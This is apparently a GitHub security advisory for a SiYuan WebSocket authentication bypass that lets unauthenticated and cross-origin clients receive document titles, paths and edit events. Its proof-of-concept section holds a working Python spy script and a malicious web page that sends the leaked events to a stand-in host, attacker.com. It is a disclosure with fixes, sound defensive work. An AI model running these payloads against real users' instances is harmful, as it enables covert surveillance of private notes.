# [M] SiYuan Vulnerable to Cross-Origin WebSocket Hijacking via Authentication Bypass — Unauthenticated Information Disclosure

## Summary
Severity: Medium
Advisory: GHSA-xp2m-98x8-rpj6
CVE: CVE-2026-32815
CWE: CWE-287
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-16
Source: https://github.com/advisories/GHSA-xp2m-98x8-rpj6
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0

## Details
# Cross-Origin WebSocket Hijacking via Authentication Bypass — Unauthenticated Information Disclosure

## Summary

SiYuan's WebSocket endpoint (`/ws`) allows unauthenticated connections when specific URL parameters are provided (`?app=siyuan&id=auth&type=auth`). This bypass, intended for the login page to keep the kernel alive, allows any external client — including malicious websites via cross-origin WebSocket — to connect and receive all server push events in real-time. These events leak sensitive document metadata including document titles, notebook names, file paths, and all CRUD operations performed by authenticated users.

Combined with the absence of `Origin` header validation, a malicious website can silently connect to a victim's local SiYuan instance and monitor their note-taking activity.

## Affected Component

- **File:** `kernel/server/serve.go:728-731`
- **Function:** `serveWebSocket()` → `HandleConnect` handler
- **Endpoint:** `GET /ws?app=siyuan&id=auth&type=auth` (unauthenticated)
- **Version:** SiYuan <= 3.5.9

## Root Cause

The WebSocket `HandleConnect` handler has a special case bypass (line 730) intended for the authorization page:

```go
util.WebSocketServer.HandleConnect(func(s *melody.Session) {
    authOk := true
    if "" != model.Conf.AccessAuthCode {
        // ... normal session/JWT authentication checks ...
        // authOk = false if no valid session
    }

    if !authOk {
        // Bypass: allow connection for auth page keepalive
        // 用于授权页保持连接，避免非常驻内存内核自动退出
        authOk = strings.Contains(s.Request.RequestURI, "/ws?app=siyuan") &&
                 strings.Contains(s.Request.RequestURI, "&id=auth&type=auth")
    }

    if !authOk {
        s.CloseWithMsg([]byte("  unauthenticated"))
        return
    }

    util.AddPushChan(s)  // Session added to broadcast list
})
```

Three issues combine:

1. **Authentication bypass via URL parameters:** Any client connecting with `?app=siyuan&id=auth&type=auth` bypasses all authentication checks.

2. **Full broadcast membership:** The bypassed session is added to the broadcast list via `util.AddPushChan(s)`, receiving ALL `PushModeBroadcast` events — the same events sent to authenticated clients.

3. **No Origin validation:** The WebSocket endpoint does not check the `Origin` header, allowing cross-origin connections from any website.

## Proof of Concept

**Tested and confirmed on SiYuan v3.5.9 (Docker) with `accessAuthCode` configured.**

### 1. Direct unauthenticated connection

```python
import asyncio, json, websockets

async def spy():
    # Connect WITHOUT any authentication cookie
    uri = "ws://TARGET:6806/ws?app=siyuan&id=auth&type=auth"
    async with websockets.connect(uri) as ws:
        print("Connected without authentication!")
        while True:
            msg = await ws.recv()
            data = json.loads(msg)
            cmd = data.get("cmd")
            d = data.get("data", {})

            if cmd == "rename":
                print(f"[LEAKED] Document renamed: {d.get('title')}")
            elif cmd == "create":
                print(f"[LEAKED] Document created: {d.get('path')}")
            elif cmd == "renamenotebook":
                print(f"[LEAKED] Notebook renamed: {d.get('name')}")
            elif cmd == "removeDoc":
                print(f"[LEAKED] Document deleted")
            elif cmd == "transactions":
                for tx in d if isinstance(d, list) else []:
                    for op in tx.get("doOperations", []):
                        if op.get("action") == "updateAttrs":
                            new = op.get("data", {}).get("new", {})
                            print(f"[LEAKED] Doc attrs: title={new.get('title')}")

asyncio.run(spy())
```

### 2. Cross-origin attack from malicious website

```html
<!-- Hosted on https://attacker.com/spy.html -->
<script>
// Victim has SiYuan running on localhost:6806
const ws = new WebSocket("ws://localhost:6806/ws?app=siyuan&id=spy&type=auth");

ws.onopen = () => console.log("Connected to victim's SiYuan!");

ws.onmessage = (event) => {
    const data = JSON.parse(event.data);
    // Exfiltrate document operations to attacker
    fetch("https://attacker.com/collect", {
        method: "POST",
        body: JSON.stringify({
            cmd: data.cmd,
            data: data.data,
            timestamp: Date.now()
        })
    });
};
</script>
```

### 3. Confirmed leaked events

The following events are received by the unauthenticated WebSocket:

| Event | Leaked Data |
|-------|-------------|
| `savedoc` | Document root ID, operation data |
| `transactions` | Document title, ID, attrs (new/old) |
| `create` | Document path, notebook info (name, ID) |
| `rename` | New document title, path, notebook ID |
| `renamenotebook` | New notebook name, notebook ID |
| `removeDoc` | Document deletion event |

### 4. Cross-origin connection confirmed

```python
import websockets, asyncio

async def test():
    uri = "ws://localhost:6806/ws?app=siyuan&id=attacker&type=auth"
    extra_headers = {"Origin": "https://evil.attacker.com"}
    async with websockets.connect(uri, additional_headers=extra_headers) as ws:
        print("Cross-origin connection accepted!")  # SUCCEEDS

asyncio.run(test())
```

**Result:** Connection succeeds — no Origin validation.

## Attack Scenario

1. Victim runs SiYuan desktop (Electron, listens on `localhost:6806`) or Docker instance
2. Victim has `accessAuthCode` configured (server is password-protected)
3. Victim visits `attacker.com` in any browser
4. Attacker's JavaScript connects to `ws://localhost:6806/ws?app=siyuan&id=spy&type=auth`
5. WebSocket connection bypasses authentication
6. Attacker silently monitors ALL document operations in real-time:
   - Document titles ("Q4 Financial Results", "Employee Reviews", "Patent Draft")
   - Notebook names ("Personal", "Work - Confidential")
   - File paths and document IDs
   - Create/rename/delete operations
7. Attacker builds a profile of the victim's note-taking activity without any visible indication

## Impact

- **Severity:** HIGH (CVSS ~7.5)
- **Type:** CWE-287 (Improper Authentication), CWE-200 (Exposure of Sensitive Information), CWE-1385 (Missing Origin Validation in WebSockets)
- Authentication bypass on WebSocket endpoint when `accessAuthCode` is configured
- Cross-origin WebSocket hijacking — any website can connect to local SiYuan instance
- Real-time information disclosure of document metadata (titles, paths, operations)
- No user interaction required beyond visiting a malicious website
- Affects both Electron desktop and Docker/server deployments
- Silent — no visible indication to the user

## Suggested Fix

### 1. Remove the URL parameter authentication bypass

```go
// Remove or restrict the auth page bypass
// Before (vulnerable):
authOk = strings.Contains(s.Request.RequestURI, "/ws?app=siyuan") &&
         strings.Contains(s.Request.RequestURI, "&id=auth&type=auth")

// After: Use a separate, restricted endpoint for auth page keepalive
// that does NOT receive broadcast events
```

### 2. Add Origin header validation

```go
util.WebSocketServer.HandleConnect(func(s *melody.Session) {
    // Validate Origin header
    origin := s.Request.Header.Get("Origin")
    if origin != "" {
        allowed := false
        for _, o := range []string{"http://localhost", "http://127.0.0.1", "app://"} {
            if strings.HasPrefix(origin, o) {
                allowed = true
                break
            }
        }
        if !allowed {
            s.CloseWithMsg([]byte("origin not allowed"))
            return
        }
    }
    // ... rest of auth logic
})
```

### 3. Separate keepalive from broadcast

If the auth page needs a WebSocket for keepalive, create a separate endpoint (`/ws-keepalive`) that only handles ping/pong without receiving broadcast events. Do not add keepalive sessions to the broadcast push channel.

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-xp2m-98x8-rpj6
- https://nvd.nist.gov/vuln/detail/CVE-2026-32815
- https://github.com/siyuan-note/siyuan/commit/1e370e37359778c0932673e825182ff555b504a3
- https://github.com/siyuan-note/siyuan
- https://github.com/siyuan-note/siyuan/releases/tag/v3.6.1
